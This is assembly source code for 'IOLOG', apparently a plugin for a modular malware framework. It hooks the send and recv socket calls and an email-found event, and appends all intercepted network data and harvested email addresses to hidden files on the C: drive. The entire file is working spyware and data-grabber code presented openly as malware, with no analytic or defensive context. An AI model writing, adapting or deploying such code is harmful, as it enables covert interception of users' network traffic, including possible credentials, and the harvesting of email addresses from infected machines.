   ; IOLOG
   ; ~~~~~
   ; - send/recv/... data grabber

   include                 INCLUDE\consts.inc
   include                 iohooker.inc
   include                 rxio.inc
   include                 iodaemon.inc

   include                 plugin.inc
                           PLUGIN_START    IOLOG, CODE32, NON_PERMUTABLE

   handleevent:            hookevent EV_IOHOOKER_ON_SEND, onsend
                           hookevent EV_IOHOOKER_ON_RECV, onrecv
                           hookevent EV_IODAEMON_GOT_EMAIL, onemail
                           stc
                           retn

   ; send/recv stack frame:
   ;                       mov     eax, [edx+0]    ; SOCKET
   ;                       mov     eax, [edx+8]    ; len
   ;                       mov     eax, [edx+4]    ; buf
   ;                       mov     eax, [edx+12]   ; flags

   ; input: EDX=send() stack frame ptr

   onsend:                 pusha

                           mov     edi, [edx+4]    ; buf
                           mov     ecx, [edx+8]    ; len
                           getofs  edx, file_send
                           call    appendbuf

                           popa
                           stc
                           retn

   ; input: EDX=recv() stack frame ptr
   ;        ECX=# of bytes received

   onrecv:                 pusha

                           mov     edi, [edx+4]    ; buf
                           getofs  edx, file_recv
                           call    appendbuf

                           popa
                           stc
                           retn

   ; input: EDX=email, ECX=len

   onemail:                pusha

                           mov     edi, edx
                           getofs  edx, file_email
                           call    appendbuf

                           push    0A0Dh
                           mov     edi, esp
                           mov     ecx, 2
                           call    appendbuf
                           pop     ecx

                           popa
                           stc
                           retn

   ;----------------------------------------------------------------------------

   ; input: EDX=file
   ;        EDI=buf
   ;        ECX=len

   appendbuf:              pusha

                           event   EV_rx_fopen_rw
                           jnc     __success
                           event   EV_rx_fcreate
                           jc      __exit
   __success:              xchg    ebx, eax

                           event   EV_rx_fgetsize
                           xchg    esi, eax        ; esi = pos = eof

                           mov     edx, edi        ; edx = buf, ecx = size
                           event   EV_rx_fwrite

                           event   EV_rx_fclose
   __exit:
                           popa
                           retn

   file_send               db      'c:\_xxx',0
   file_recv               db      'c:\_xxx',0
   file_email              db      'c:\_email',0

                           PLUGIN_END
